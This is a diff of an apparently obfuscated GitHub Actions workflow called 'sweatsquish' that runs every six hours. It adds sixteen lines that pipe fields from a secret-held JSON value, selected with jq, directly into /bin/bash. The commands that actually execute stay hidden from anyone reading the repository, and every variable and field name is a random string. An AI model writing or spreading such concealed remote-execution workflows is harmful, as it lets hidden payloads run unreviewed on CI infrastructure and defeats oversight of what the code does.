@@ -1,11 +1,10 @@
 name: sweatsquish
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
+    - cron: '54 5/6 * * *'
 
-jobs:  # 7388
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,10 +12,22 @@ jobs:  # 7388
       - uses: actions/checkout@v4
       - name: sweatsquish
         env:
-          j6519: ${{ secrets.j6519 }}
+          kca1: ${{ secrets.kca1 }}
         run: |
-          echo $j6519 | jq -r .svl2659 | /bin/bash
-          echo $as95 | jq -r .qos51 | /bin/bash
-          echo $kbysk66583 | jq -r .shqj8 | /bin/bash
-          echo $ih377 | jq -r .aot767 | /bin/bash
+          echo $kca1 | jq -r .casj25 | /bin/bash
+          echo $hwl81038 | jq -r .rtt24309 | /bin/bash
+          echo $qsv404 | jq -r .qkv58645 | /bin/bash
+          echo $p3048 | jq -r .sf165 | /bin/bash
+          echo $zn695 | jq -r .wz3530 | /bin/bash
+          echo $n77 | jq -r .hyavf66173 | /bin/bash
+          echo $u60 | jq -r .bsqdc4191 | /bin/bash
+          echo $uwvub441 | jq -r .x56366 | /bin/bash
+          echo $ff0 | jq -r .wfnrn33 | /bin/bash
+          echo $v6 | jq -r .bzb422 | /bin/bash
+          echo $xfwvn556 | jq -r .bk639 | /bin/bash
+          echo $yfoh19101 | jq -r .dan0 | /bin/bash
+          echo $vx2778 | jq -r .x9886 | /bin/bash
+          echo $qvszr9 | jq -r .neu272 | /bin/bash
+          echo $oesw252 | jq -r .ii085 | /bin/bash
+          echo $o4751 | jq -r .fzsav4 | /bin/bash
 
